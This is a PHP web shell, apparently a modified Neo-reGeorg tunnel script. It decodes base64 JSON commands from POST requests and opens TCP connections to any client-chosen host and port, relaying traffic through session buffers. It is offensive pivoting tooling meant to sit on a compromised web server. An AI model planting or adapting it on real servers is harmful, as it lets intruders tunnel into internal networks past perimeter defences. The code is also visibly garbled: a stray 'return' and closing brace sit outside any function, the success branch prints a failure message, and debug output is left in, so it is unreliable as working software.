<?php
// config
ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
ini_set('always_populate_raw_post_data', -1);
error_reporting(E_ERROR | E_PARSE);

// define constant

define('BLV_L_OFFSET', 5);
define('READBUF', 1024);
define('MAXREADSIZE', 10240);
define('USE_REQUEST_TEMPLATE', 0);
define('START_INDEX', 0);
define('END_INDEX', 0);

// HTTP response code Handling : send arbitrary code as response
if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(200);

    return $info;
}


// indexes of info array to store input 
$DATA          = 1;
$CMD           = 2;
$MARK          = 3;
$STATUS        = 4;
$ERROR         = 5;
$IP            = 6;
$PORT          = 7;
$REDIRECTURL   = 8;
$FORCEREDIRECT = 9;



//extracting input 
$post_data = file_get_contents("php://input");
echo "\n",$post_data, "\n";


//useless test added by neo-regeorg, might be useful later
if (USE_REQUEST_TEMPLATE == 1) {
    $post_data = substr($post_data, START_INDEX);
    $post_data = substr($post_data, 0, -END_INDEX);
}

//$info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
$info = json_decode(base64_decode($post_data),true);
if (!$info){
	die("payload failed");
}

echo "\n decoded payload : ", base64_decode($post_data), "\n";

$rinfo = array();

$mark = $info[$MARK];

$cmd = $info[$CMD];

$run = "run".$mark;

$writebuf = "writebuf".$mark;
$readbuf = "readbuf".$mark;


//command handling

switch($cmd){
    case "CONNECT":
        {
            set_time_limit(0);
            $target = $info[$IP];
            $port = (int) $info[$PORT];
            $res = fsockopen($target, $port, $errno, $errstr, 3);
            if ($res === false)
            {
                $rinfo[$STATUS] = 'FAIL';
		$rinfo[$ERROR] = 'Failed connecting to target';
		echo "\nError connecting to $target:$port.";//Error $errno: $errstr\n";
                break;
	    }
	    else {
		    echo "\n failed conecting to $target:$port";
		    error_log("successfully connected to $target : $port");
		}

            stream_set_blocking($res, false);
            ignore_user_abort();

            @session_start();
            $_SESSION[$run] = true;
            $_SESSION[$writebuf] = "";
            $_SESSION[$readbuf] = "";
            session_write_close();

            while ($_SESSION[$run])
            {
                if (empty($_SESSION[$writebuf])) {
                    usleep(50000);
                }

                $readBuff = "";
                @session_start();
                $writeBuff = $_SESSION[$writebuf];
                $_SESSION[$writebuf] = "";
                session_write_close();
                if ($writeBuff != "")
                {
                    stream_set_blocking($res, false);
                    $i = fwrite($res, $writeBuff);
                    if($i === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                }
                stream_set_blocking($res, false);
                while ($o = fgets($res, 513)) {
                    if($o === false)
                    {
                        @session_start();
                        $_SESSION[$run] = false;
                        session_write_close();
                        return;
                    }
                    $readBuff .= $o;
                    if ( strlen($readBuff) > 524288) {
                        break;
                    }
                }
                if ($readBuff != ""){
                    @session_start();
                    $_SESSION[$readbuf] .= $readBuff;
                    session_write_close();
                }
            }
            fclose($res);
        }
        @header_remove('set-cookie');
        break;
    case "DISCONNECT":
        {
            @session_start();
            unset($_SESSION[$run]);
            unset($_SESSION[$readbuf]);
            unset($_SESSION[$writebuf]);
            session_write_close();
        }
        break;
    case "READ":
        {
            @session_start();
            $readBuffer = $_SESSION[$readbuf];
            $_SESSION[$readbuf]="";
            $running = $_SESSION[$run];
            session_write_close();
            if ($running) {
                $rinfo[$STATUS] = 'OK';
                $rinfo[$DATA] = $readBuffer;
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
            }
        }
        break;
    case "FORWARD": {
            @session_start();
            $running = $_SESSION[$run];
            session_write_close();
            if(!$running){
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'TCP session is closed';
                break;
            }
            $rawPostData = $info[$DATA];
            if ($rawPostData) {
                @session_start();
                $_SESSION[$writebuf] .= $rawPostData;
                session_write_close();
                $rinfo[$STATUS] = 'OK';
                header("Connection: Keep-Alive");
            } else {
                $rinfo[$STATUS] = 'FAIL';
                $rinfo[$ERROR] = 'POST data parse error';
            }
        }
        break;
    default: {
        $sayhello = true;
        @session_start();
	session_write_close();
	echo "debug info ";
	var_dump($info);
	die();
    }
}
if ( $sayhello ) {
echo "euuuhhhhhhhh \n";
} else {
    echo json_encode($rinfo);
}
?>
